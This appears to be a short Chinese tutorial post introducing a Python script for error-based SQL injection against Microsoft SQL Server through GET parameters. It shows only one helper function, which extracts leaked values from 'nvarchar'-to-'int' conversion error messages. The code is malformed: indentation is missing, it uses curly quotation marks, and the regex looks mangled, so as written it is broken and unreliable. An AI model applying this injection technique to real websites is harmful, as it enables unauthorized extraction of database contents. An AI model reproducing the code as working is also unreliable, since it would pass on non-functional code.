基于mssql的报错注入的脚本(get)

在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。

对于get型的mssql的报错注入,代码如下：
[python]

def getdata(content):
patt = re.compile(“nvarchar.?’(.?)’.*?int”)
data = patt.findall(content)
if data:
return data[0]
else:
return None
